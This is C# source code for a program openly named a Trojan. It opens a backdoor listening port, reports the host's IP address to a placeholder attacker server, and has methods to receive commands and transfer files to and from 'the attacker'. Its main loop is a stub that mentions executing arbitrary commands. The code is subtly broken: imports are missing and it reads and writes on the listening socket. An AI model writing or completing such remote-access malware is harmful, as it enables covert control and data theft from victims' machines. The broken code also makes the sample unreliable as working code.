using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Trojan
{
    class Trojan
    {
        private Socket socket;

        public Trojan()
        {
            // Create the socket for the backdoor
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            // Bind the socket to a local port
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Any, 1234);
            socket.Bind(endpoint);

            // Listen for incoming connections
            socket.Listen(1);
        }
        public void SendIP()
        {
            // Get the client's hostname and IP address
            string hostname = Dns.GetHostName();
            IPAddress ipAddress = Dns.GetHostEntry(hostname).AddressList[0];

            // Create a socket and connect to the server
            IPEndPoint serverEndpoint = new IPEndPoint(IPAddress.Parse("server_hostname_or_ip"), 1234);
            Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            clientSocket.Connect(serverEndpoint);

            // Send the client's IP address to the server
            byte[] message = Encoding.UTF8.GetBytes(ipAddress.ToString());
            clientSocket.Send(message);
        }
        public string ReceiveCommand()
        {
            // Create a buffer to store the received data
            byte[] buffer = new byte[1024];

            // Receive data from the attacker
            int bytesReceived = socket.Receive(buffer);

            // Convert the received data to a string
            string command = Encoding.UTF8.GetString(buffer, 0, bytesReceived);

            return command;
        }
        public void ReceiveFile(string filePath)
        {
            // Receive the file size from the attacker
            byte[] fileSizeBuffer = new byte[4];
            int bytesReceived = socket.Receive(fileSizeBuffer);
            int fileSize = BitConverter.ToInt32(fileSizeBuffer, 0);

            // Receive the file contents from the attacker
            byte[] fileContents = new byte[fileSize];
            bytesReceived = socket.Receive(fileContents);

            // Write the file contents to the specified file path
            File.WriteAllBytes(filePath, fileContents);
        }

        public void SendFile(string filePath)
        {
            // Read the contents of the file into a byte array
            byte[] fileContents = File.ReadAllBytes(filePath);

            // Send the file size and contents to the attacker
            byte[] fileSizeBuffer = BitConverter.GetBytes(fileContents.Length);
            socket.Send(fileSizeBuffer);
            socket.Send(fileContents);
        }

        public void Run()
        {
            // Accept an incoming connection
            Socket client = socket.Accept();

            // Run the Trojan in the background
            new Thread(() =>
            {
                while (true)
                {
                    // Perform some action here, such as uploading or downloading files,
                    // capturing user input, or executing arbitrary commands.

                    // Sleep for 10 seconds
                    Thread.Sleep(10000);
                }
            }).Start();
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            // Create the Trojan and run it
            Trojan trojan = new Trojan();
            trojan.Run();
        }
    }
}
